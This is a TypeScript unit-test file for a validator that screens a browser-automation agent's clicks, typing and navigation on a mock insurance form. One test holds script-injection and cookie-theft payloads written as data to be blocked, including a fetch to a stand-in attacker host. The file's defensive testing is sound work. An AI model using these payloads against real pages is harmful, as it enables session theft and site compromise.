/**
 * Local Action Validator Unit Tests
 */

import { describe, it, expect, beforeEach } from "vitest";
import { ActionValidator } from "../src/validator/action-validator";
import { createMockInsuranceFormContext } from "../src/mock/mock-security-context";
import { ValidationContext, AgentAction } from "../../shared/types";

describe("Local Action Validator Engine", () => {
  let validator: ActionValidator;
  let context: ValidationContext;

  beforeEach(() => {
    validator = new ActionValidator();
    context = createMockInsuranceFormContext();
  });

  it("approves valid standard actions on present DOM elements", async () => {
    const validActions: AgentAction[] = [
      { action: "CLICK", target: "btn_submit" },
      { action: "TYPE_REFERENCE", target: "input_name", reference: "NAME_1" },
      { action: "TYPE_REFERENCE", target: "input_email", reference: "EMAIL_1" },
      { action: "WAIT", target: "" },
      { action: "SCROLL", target: "btn_submit" },
    ];

    for (const act of validActions) {
      const res = await validator.validateAction(act, context);
      expect(res.allowed).toBe(true);
      expect(res.riskLevel).toBe("LOW");
    }
  });

  it("rejects unknown action verbs outside the authorized vocabulary", async () => {
    const invalidVerbs = ["EXECUTE_JS", "EVAL", "INJECT_SCRIPT", "DOWNLOAD", "DELETE"];

    for (const verb of invalidVerbs) {
      const res = await validator.validateAction(
        { action: verb as any, target: "btn_submit" },
        context
      );
      expect(res.allowed).toBe(false);
      expect(res.riskLevel).toBe("BLOCKED");
      expect(res.reason).toMatch(/UNKNOWN_ACTION_VOCABULARY/i);
    }
  });

  it("rejects actions targeting non-existent elements", async () => {
    const res = await validator.validateAction(
      { action: "CLICK", target: "ghost_element_12345" },
      context
    );

    expect(res.allowed).toBe(false);
    expect(res.riskLevel).toBe("HIGH");
    expect(res.reason).toMatch(/TARGET_ELEMENT_NOT_FOUND/i);
  });

  it("rejects actions on disabled or invisible elements", async () => {
    const customContext = createMockInsuranceFormContext({
      domElements: [
        {
          id: "btn_disabled",
          tag: "button",
          visible: true,
          disabled: true,
        },
        {
          id: "btn_hidden",
          tag: "button",
          visible: false,
          disabled: false,
        },
      ],
    });

    const resDisabled = await validator.validateAction(
      { action: "CLICK", target: "btn_disabled" },
      customContext
    );
    expect(resDisabled.allowed).toBe(false);
    expect(resDisabled.reason).toMatch(/disabled/i);

    const resHidden = await validator.validateAction(
      { action: "CLICK", target: "btn_hidden" },
      customContext
    );
    expect(resHidden.allowed).toBe(false);
    expect(resHidden.reason).toMatch(/not visible/i);
  });

  it("strictly blocks actions attempting to automate password fields", async () => {
    const res = await validator.validateAction(
      { action: "TYPE_REFERENCE", target: "input_password", reference: "PASS_1" },
      context
    );

    expect(res.allowed).toBe(false);
    expect(res.riskLevel).toBe("BLOCKED");
    expect(res.reason).toMatch(/PASSWORD_TARGET_AUTOMATION_FORBIDDEN/i);
  });

  it("detects and blocks prompt injection and dangerous script payloads", async () => {
    const injectionActions: AgentAction[] = [
      { action: "NAVIGATE", target: "javascript:alert(document.cookie)" },
      { action: "NAVIGATE", target: "data:text/html,<script>alert(1)</script>" },
      { action: "TYPE", target: "input_name", value: "<script>fetch('attacker.com')</script>" },
      { action: "CLICK", target: "btn_submit", value: "document.cookie" },
    ];

    for (const act of injectionActions) {
      const res = await validator.validateAction(act, context);
      expect(res.allowed).toBe(false);
      expect(res.riskLevel).toBe("BLOCKED");
      expect(res.reason).toMatch(/PROMPT_INJECTION|UNAUTHORIZED_NAVIGATION/i);
    }
  });

  it("validates navigation URL protocol and domain restrictions", async () => {
    // 1. Safe navigation to allowed domain
    const safeNav = await validator.validateAction(
      { action: "NAVIGATE", target: "", value: "https://claims.insurance-demo.com/step2" },
      context
    );
    expect(safeNav.allowed).toBe(true);

    // 2. Unsafe navigation to untrusted domain
    const untrustedNav = await validator.validateAction(
      { action: "NAVIGATE", target: "", value: "https://phishing-site.evil.com/login" },
      context
    );
    expect(untrustedNav.allowed).toBe(false);
    expect(untrustedNav.reason).toMatch(/whitelist/i);
  });

  it("rejects unauthorized reference tokens not present in session context", async () => {
    const res = await validator.validateAction(
      { action: "TYPE_REFERENCE", target: "input_name", reference: "FORGED_REF_TOKEN" },
      context
    );

    expect(res.allowed).toBe(false);
    expect(res.reason).toMatch(/INVALID_OR_EXPIRED_REFERENCE_TOKEN/i);
  });
});
